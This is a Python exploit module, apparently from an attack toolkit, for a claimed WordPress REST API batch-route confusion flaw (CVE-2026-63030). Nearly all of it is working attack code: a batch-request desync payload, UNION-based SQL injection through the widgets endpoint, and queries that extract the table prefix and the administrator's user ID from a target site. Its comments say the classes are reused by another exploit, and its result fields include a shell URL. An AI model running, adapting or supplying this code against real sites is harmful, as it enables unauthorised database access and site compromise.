# -*- coding: utf-8 -*-
# CVE-2026-63030 — WordPress REST API Batch Route Confusion -> SQL Injection
# Function-only refactor. No classes exported. No import side-effects. Thread-safe.
# Usage:
#     from function.cve_2026_63030 import exploit
#     r = exploit('http://target.com')
#     if r['vulnerable']:
#         print(r['evidence'])   # {'db_prefix': 'wp_', 'admin_id': 1}
# Coded by HanJsXploit — refactored
import hashlib
import json
import re
import secrets
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from http.cookiejar import CookieJar

CVE_ID = 'CVE-2026-63030'
DEFAULT_TIMEOUT = 30.0
DESYNC_PRIMER = {"method": "POST", "path": "///"}
POST_DATE = "2020-01-01 00:00:00"
EMBED_WIDTH = "500"
EMBED_HEIGHT = "750"
EMBED_ATTRS_SERIALIZED = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
UNION_MARKER_HEX = "776f726470726573733078"


# ────────────── SQL helpers ──────────────
def sql_hex(s):
    if not s:
        return "''"
    return "0x" + s.encode("utf-8").hex()


def sql_post_row(row_id, content="", title="", status="publish", slug="",
                 parent=0, post_type="post", author=1):
    id_col = str(row_id)
    slug = slug or f"r{secrets.token_hex(3)}"
    return "SELECT " + ",".join([
        id_col, str(author), f"'{POST_DATE}'", f"'{POST_DATE}'",
        sql_hex(content), sql_hex(title), "''", sql_hex(status),
        "'closed'", "'closed'", "''", sql_hex(slug), "''", "''",
        f"'{POST_DATE}'", f"'{POST_DATE}'", "''", str(parent), "''",
        "0", sql_hex(post_type), "''", "0",
    ])


def oembed_cache_key(url):
    payload = url + EMBED_ATTRS_SERIALIZED
    return hashlib.md5(payload.encode()).hexdigest()


# ────────────── HTTP client ──────────────
class _Response:
    __slots__ = ('status', 'body', 'elapsed', 'headers')

    def __init__(self, status, body, elapsed, headers=None):
        self.status = status
        self.body = body
        self.elapsed = elapsed
        self.headers = headers or {}

    def json(self):
        return json.loads(self.body)


class Client:
    """Public — reused by cve_2026_60137."""
    def __init__(self, base_url, timeout=DEFAULT_TIMEOUT, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.request_count = 0
        self._batch_url = None
        self._cookie_jar = CookieJar()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers = [
            urllib.request.HTTPSHandler(context=ctx),
            urllib.request.HTTPCookieProcessor(self._cookie_jar),
        ]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0 (compatible)")]

    @property
    def batch_url(self):
        if self._batch_url is None:
            self._batch_url = self._negotiate_batch_url()
        return self._batch_url

    def _negotiate_batch_url(self):
        pretty = f"{self.base_url}/wp-json/batch/v1"
        try:
            resp = self._send(pretty, method="POST",
                              data=b'{"requests":[]}',
                              headers={"Content-Type": "application/json"},
                              timeout=min(self.timeout, 10))
            if resp.status == 207:
                return pretty
        except Exception:
            pass
        return f"{self.base_url}/?rest_route=/batch/v1"

    def get(self, path):
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        return self._send(url, method="GET")

    def batch(self, payload, timeout=None):
        return self._send(
            self.batch_url, method="POST",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            timeout=timeout or self.timeout,
        )

    def _send(self, url, method="GET", data=None, headers=None, timeout=None):
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        self.request_count += 1
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=timeout or self.timeout)
            return _Response(resp.status, resp.read().decode("utf-8", "replace"),
                             time.monotonic() - start, dict(resp.headers))
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace") if exc.fp else ""
            return _Response(exc.code, body, time.monotonic() - start,
                             dict(exc.headers) if exc.headers else {})
        except OSError as exc:
            raise RuntimeError(f"Cannot reach {url}: {exc}")

    def login(self, username, password):
        login_url = f"{self.base_url}/wp-login.php"
        data = urllib.parse.urlencode({
            "log": username, "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/",
            "testcookie": "1",
        }).encode()
        resp = self._send(login_url, method="POST", data=data,
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          timeout=15)
        location = ""
        for k, v in resp.headers.items():
            if k.lower() == "location":
                location = v
                break
        if resp.status in (301, 302) and "wp-admin" in location:
            return True
        if resp.status == 200 and ("dashboard" in resp.body.lower() or "wp-admin" in resp.body.lower()):
            return True
        for cookie in self._cookie_jar:
            if cookie.name == "wordpress_logged_in" and cookie.value:
                return True
        return False


# ────────────── desync + UNION primitive ──────────────
class Desync:
    """Public — reused by cve_2026_60137."""
    def __init__(self, client):
        self.client = client

    def union_inject(self, rows, timeout=None, tail_requests=None):
        sql_term = "\n-- " * 6
        sqli = f"0) AND 1=0 UNION ALL {rows}{sql_term}"
        return self.client.batch(self._union_payload(sqli, tail_requests), timeout=timeout)

    def _union_payload(self, sqli, tail_requests):
        encoded = urllib.parse.quote(sqli, safe="")
        inner = [
            DESYNC_PRIMER,
            {"method": "GET", "path": (
                f"/wp/v2/widgets?author_exclude={encoded}"
                "&per_page=500&orderby=none"
            )},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "GET", "path": "/wp/v2/categories"},
        ]
        if tail_requests:
            inner.extend(tail_requests)
            inner.append({"method": "POST", "path": "/wp/v2/users", "body": {}})
        return {"requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}


class UnionExtractor:
    """Public — reused by cve_2026_60137."""
    def __init__(self, desync):
        self.desync = desync

    def available(self):
        return self.extract("SELECT 'wp2shell_probe'") == "wp2shell_probe"

    def integer(self, query):
        val = self.extract(query)
        return int(val) if val and val.lstrip("-").isdigit() else 0

    def extract(self, query, max_length=4096):
        title_expr = f"CONCAT(0x{UNION_MARKER_HEX},HEX(CAST(({query}) AS CHAR)))"
        row = self._forge_row(title=title_expr)
        resp = self.desync.union_inject(row)
        return self._decode_response(resp)

    def _forge_row(self, title="''"):
        return "SELECT " + ",".join([
            "99999999", "1", f"'{POST_DATE}'", f"'{POST_DATE}'", "''",
            title, "''", "'publish'", "'closed'", "'closed'", "''",
            sql_hex(f"u{secrets.token_hex(4)}"), "''", "''",
            f"'{POST_DATE}'", f"'{POST_DATE}'", "''", "0", "''",
            "0", "'post'", "''", "0",
        ])

    def _decode_response(self, resp):
        marker = bytes.fromhex(UNION_MARKER_HEX).decode()
        idx = resp.body.find(marker)
        if idx < 0:
            return None
        after = resp.body[idx + len(marker):]
        hex_chars = []
        for ch in after:
            if ch in "0123456789abcdefABCDEF":
                hex_chars.append(ch)
            else:
                break
        if not hex_chars:
            return ""
        try:
            return bytes.fromhex("".join(hex_chars)).decode("utf-8", "replace")
        except ValueError:
            return None


# ────────────── discovery helpers ──────────────
def find_embed_url(client):
    try:
        resp = client.get("/?rest_route=/wp/v2/posts&per_page=1&_fields=link")
        if resp.status == 200:
            posts = resp.json()
            if posts and isinstance(posts, list):
                return posts[0]["link"]
    except Exception:
        pass
    try:
        resp = client.get("/")
        if resp.status == 200:
            m = re.search(r'<link\s+rel=["\']canonical["\']\s+href=["\']([^"\']+)', resp.body)
            if m:
                return m.group(1)
    except Exception:
        pass
    return f"{client.base_url}/?p=1"


def discover_prefix(extractor, default="wp_"):
    try:
        result = extractor.extract(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%usermeta' "
            "ORDER BY TABLE_NAME LIMIT 1", max_length=64)
        if result and result.endswith("usermeta"):
            return result[:-8]
    except Exception:
        pass
    return default


def discover_admin_id(extractor, prefix):
    try:
        result = extractor.integer(
            f"SELECT u.ID FROM {prefix}users u "
            f"INNER JOIN {prefix}usermeta m ON u.ID=m.user_id "
            f"WHERE m.meta_key='{prefix}capabilities' "
            f"AND m.meta_value LIKE '%administrator%' "
            f"ORDER BY u.ID LIMIT 1")
        if result > 0:
            return result
    except Exception:
        pass
    return 1


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, debug=False, timeout=DEFAULT_TIMEOUT, proxy=None):
    """
    Detect & prove CVE-2026-63030 (REST batch desync -> SQL injection).

    Args:
        target_url : str  — 'http://x.com', 'x.com'
        debug      : bool — collect step log ke result['log']
        timeout    : float — per-request timeout
        proxy      : str  — optional HTTP proxy

    Returns:
        dict standar + evidence:
          vulnerable=True  -> batch desync + UNION extraction berfungsi
          evidence         -> {'db_prefix': str, 'admin_id': int, 'probe': 'wp2shell_probe'}
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'n/a',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',   # bukan RCE, tapi pakai field yang sama biar seragam
        'output': '',
        'shell_url': '',
        'marker': '',
        'detail': '',
        'exploited': False,
        'log': [],
        'evidence': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res
    t = target_url.strip()
    if not t.startswith(('http://', 'https://')):
        t = 'http://' + t
    res['target'] = t

    try:
        client = Client(t, timeout=timeout, proxy=proxy)
        res['endpoint'] = client.batch_url

        # 1. batch endpoint alive?
        probe = client.batch({"requests": []})
        res['http_status'] = probe.status
        if probe.status != 207:
            res['detail'] = f'batch endpoint not alive (HTTP {probe.status})'
            return res
        _step('batch endpoint ok')

        # 2. UNION extractor round-trip
        desync = Desync(client)
        extractor = UnionExtractor(desync)
        if not extractor.available():
            res['detail'] = 'union extraction probe failed (patched or filtered)'
            return res
        _step('union probe round-trip ok')

        # 3. gather evidence
        prefix = discover_prefix(extractor, 'wp_')
        admin_id = discover_admin_id(extractor, prefix)
        _step(f'prefix={prefix} admin_id={admin_id}')

        res['vulnerable'] = True
        res['marker'] = 'wp2shell_probe'
        res['output'] = f'prefix={prefix} admin_id={admin_id}'
        res['evidence'] = {
            'db_prefix': prefix,
            'admin_id': admin_id,
            'probe': 'wp2shell_probe',
        }
        res['detail'] = 'batch desync + union SQLi verified'
        return res
    except Exception as e:
        res['detail'] = 'unhandled: ' + str(e)[:200]
        return res